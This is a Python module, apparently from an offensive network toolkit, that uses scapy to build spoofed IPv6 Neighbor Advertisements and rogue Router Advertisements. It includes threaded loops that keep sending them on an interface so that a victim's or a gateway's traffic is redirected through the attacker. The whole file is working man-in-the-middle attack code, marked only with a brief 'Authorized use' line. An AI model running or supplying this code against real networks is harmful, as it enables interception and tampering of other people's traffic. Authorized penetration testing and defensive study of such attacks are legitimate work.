"""NDP / IPv6 attacks — Neighbor Advertisement spoofing and rogue Router Ads.

- NA spoofing: the IPv6 analogue of ARP poisoning — claim a victim/gateway IPv6
  is at our MAC (override) so their traffic comes to us.
- Rogue RA: advertise ourselves as the default router (and a prefix), redirecting
  IPv6 traffic through us.

Builders are testable; the periodic send loops are integration. Authorized use.
"""

from __future__ import annotations

import logging
import threading
import time

log = logging.getLogger("reforge.ndp")


def build_na(target_ip6: str, our_mac: str, dst_ip6: str, dst_mac: str = "33:33:00:00:00:01"):
    """Neighbor Advertisement claiming target_ip6 is at our_mac (override)."""
    from scapy.layers.inet6 import ICMPv6ND_NA, ICMPv6NDOptDstLLAddr, IPv6
    from scapy.layers.l2 import Ether

    return (Ether(src=our_mac, dst=dst_mac)
            / IPv6(src=target_ip6, dst=dst_ip6)
            / ICMPv6ND_NA(tgt=target_ip6, R=1, S=1, O=1)
            / ICMPv6NDOptDstLLAddr(lladdr=our_mac))


def build_ra(our_mac: str, src_ll: str = "fe80::1", prefix: str = "2001:db8:dead::",
             prefixlen: int = 64, dst: str = "ff02::1", lifetime: int = 1800):
    """Rogue Router Advertisement making us the default IPv6 router."""
    from scapy.layers.inet6 import (
        ICMPv6ND_RA,
        ICMPv6NDOptPrefixInfo,
        ICMPv6NDOptSrcLLAddr,
        IPv6,
    )
    from scapy.layers.l2 import Ether

    return (Ether(src=our_mac, dst="33:33:00:00:00:01")
            / IPv6(src=src_ll, dst=dst)
            / ICMPv6ND_RA(routerlifetime=lifetime, prf=0)
            / ICMPv6NDOptSrcLLAddr(lladdr=our_mac)
            / ICMPv6NDOptPrefixInfo(prefix=prefix, prefixlen=prefixlen, L=1, A=1))


class NdpSpoofer:  # pragma: no cover (needs root + IPv6)
    def __init__(self, iface, target_ip6, victim_ip6, our_mac, interval=2.0):
        self.iface = iface
        self.target_ip6 = target_ip6
        self.victim_ip6 = victim_ip6
        self.our_mac = our_mac
        self.interval = interval
        self._t = None
        self._running = threading.Event()
        self.sent = 0

    def start(self):
        self._running.set()
        self._t = threading.Thread(target=self._loop, daemon=True); self._t.start()

    def _loop(self):
        from scapy.sendrecv import sendp

        while self._running.is_set():
            sendp(build_na(self.target_ip6, self.our_mac, self.victim_ip6),
                  iface=self.iface, verbose=False)
            self.sent += 1
            time.sleep(self.interval)

    def stop(self):
        self._running.clear()
        if self._t:
            self._t.join(timeout=2.0)


class RogueRouter:  # pragma: no cover (needs root + IPv6)
    def __init__(self, iface, our_mac, prefix="2001:db8:dead::", interval=3.0):
        self.iface = iface
        self.our_mac = our_mac
        self.prefix = prefix
        self.interval = interval
        self._t = None
        self._running = threading.Event()
        self.sent = 0

    def start(self):
        self._running.set()
        self._t = threading.Thread(target=self._loop, daemon=True); self._t.start()

    def _loop(self):
        from scapy.sendrecv import sendp

        while self._running.is_set():
            sendp(build_ra(self.our_mac, prefix=self.prefix), iface=self.iface, verbose=False)
            self.sent += 1
            time.sleep(self.interval)

    def stop(self):
        self._running.clear()
        if self._t:
            self._t.join(timeout=2.0)
